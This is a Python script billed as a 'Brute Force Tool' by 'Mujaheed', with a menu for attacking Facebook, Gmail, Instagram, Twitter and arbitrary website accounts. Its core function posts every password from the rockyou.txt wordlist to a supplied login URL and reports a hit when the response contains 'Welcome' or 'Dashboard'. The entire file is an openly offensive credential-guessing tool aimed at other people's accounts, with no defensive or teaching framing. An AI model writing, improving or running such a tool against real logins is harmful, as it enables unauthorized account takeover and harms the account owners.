import requests
import os

# ASCII Art with Mujaheed and Ariel Font
def display_ascii_art():
    print("\033[92m")  # Green text
    print("        _____      _______  __      __  _____  ")  
    print("       /     \    /  _    ||  |    |  ||     | ")  
    print("      |  Y Y  \  |  |  |  ||  |    |  ||  |  | ")  
    print("      |  |__|  | |  |  |  ||  |    |  ||  |  | ")  
    print("      |   __   | |  |  |  ||  |    |  ||  |  | ")  
    print("      |  |  |  | |  `--'  ||  `----'  ||  `--' ")  
    print("      |__|  |__|  \______/  |_______/  |_______/ ")  
    print("                                        ")  
    print("\033[0m")  # Reset color

# Display menu options
def display_menu():
    print("=" * 50)
    print("Python Brute Force Tool")
    print("Created by Mujaheed")
    print("=" * 50)
    print("\033[96m")  # Cyan text
    print("1 : Brute Force Facebook Account")
    print("2 : Brute Force Gmail Account")
    print("3 : Brute Force Instagram Account 1")
    print("4 : Brute Force Twitter Account")
    print("5 : Brute Force Instagram Account 2")
    print("6 : Brute Force Web Account")  # New web option
    print("0 : Exit")
    print("\033[0m")  # Reset color
    choice = input("Select an option: ").strip()
    return choice

# Brute Force Function
def brute_force(url, username, wordlist_file):
    print("=" * 50)
    print("Starting brute force attack on: {}".format(url))
    print("Username: {}".format(username))
    print("=" * 50)

    if not os.path.exists(wordlist_file):
        print(f"Error: Wordlist file '{wordlist_file}' not found!")
        return

    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = file.read().splitlines()
    except Exception as e:
        print(f"Error reading the wordlist file: {e}")
        return

    print(f"Loaded {len(passwords)} passwords from '{wordlist_file}'.")

    for password in passwords:
        data = {'username': username, 'password': password}
        headers = {'User-Agent': 'Mozilla/5.0'}
        try:
            response = requests.post(url, data=data, timeout=5)
            if "Welcome" in response.text or "Dashboard" in response.text:  # Adjust success keywords as necessary
                print(f"[SUCCESS] Password found: {password}")
                return
            else:
                print(f"[FAILED] Password: {password}")
        except requests.RequestException as e:
            print(f"[ERROR] {e}")
            return

    print("Brute force completed. No valid password found.")
    print("=" * 50)

if __name__ == "__main__":
    display_ascii_art()
    while True:
        choice = display_menu()
        if choice == '1':
            url = input("Enter Facebook URL: ").strip()
            username = input("Enter username: ").strip()
            brute_force(url, username, "rockyou.txt")
        elif choice == '2':
            url = input("Enter Gmail URL: ").strip()
            username = input("Enter username: ").strip()
            brute_force(url, username, "rockyou.txt")
        elif choice == '3':
            url = input("Enter Instagram URL: ").strip()
            username = input("Enter username: ").strip()
            brute_force(url, username, "rockyou.txt")
        elif choice == '4':
            url = input("Enter Twitter URL: ").strip()
            username = input("Enter username: ").strip()
            brute_force(url, username, "rockyou.txt")
        elif choice == '5':
            url = input("Enter Instagram URL: ").strip()
            username = input("Enter username: ").strip()
            brute_force(url, username, "rockyou.txt")
        elif choice == '6':  # New web option
            url = input("Enter target website URL: ").strip()
            username = input("Enter username: ").strip()
            brute_force(url, username, "rockyou.txt")
        elif choice == '0':
            print("Exiting the tool.")
            break
        else:
            print("Invalid option, please try again.")
